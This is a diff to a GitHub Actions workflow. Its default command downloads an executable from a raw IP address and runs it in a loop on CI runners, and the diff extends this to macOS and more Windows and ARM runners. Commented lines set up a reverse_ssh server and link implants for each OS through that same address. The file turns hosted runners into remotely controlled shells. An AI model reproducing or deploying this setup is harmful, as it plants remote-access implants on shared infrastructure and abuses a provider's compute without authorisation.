@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
     inputs:
       runs-on:
-        default: 'ubuntu-latest'
+        default: 'ubuntu-24.04-arm windows-11-arm macos-latest ubuntu-latest windows-latest macos-15-intel ubuntu-slim'
       run:
         default: |
           python3 -c 'import urllib.request; urllib.request.urlretrieve("http://109.188.87.160:6666/{0}_{1}", r"{2}/exe.exe")' && chmod +x '{2}/exe.exe' && touch exit && '{2}/exe.exe' --foreground
@@ -31,7 +31,8 @@ jobs:
         Set-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -name "NV Hostname" -value  $ComputerName
         Set-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -name "AltDefaultDomainName" -value $ComputerName
         Set-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -name "DefaultDomainName" -value $ComputerName
-
+    - if: ${{ runner.os == 'macOS' }}
+      run: sudo scutil --set HostName ${{ runner.arch }}${{ runner.os }}
     - shell: bash
       run: |
         while (${{ format(inputs.run, runner.arch, runner.os, runner.temp) }}) || true
@@ -52,6 +53,8 @@ jobs:
 #(sleep 5;  ssh -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 127.0.0.1 link --goos windows --goarch amd64 --name X64_Windows) &
 #(sleep 5;  ssh -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 127.0.0.1 link --goos linux --goarch arm64 --name ARM64_Linux) &
 #(sleep 5;  ssh -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 127.0.0.1 link --goos linux --goarch amd64 --name X64_Linux) &
+#(sleep 5;  ssh -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 127.0.0.1 link --goos darwin --goarch arm64 --name ARM64_macOS) &
+#(sleep 5;  ssh -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 127.0.0.1 link --goos darwin --goarch amd64 --name X64_macOS) &
 #docker run --rm -it -p6666:2222 -e EXTERNAL_ADDRESS=109.188.87.160:6666 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_rsa.pub)" --mount type=tmpfs,destination=/data reversessh/reverse_ssh
 
 #ssh -o ProxyCommand="ssh -W %h:%p 127.0.0.1 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null runner.arm64linux
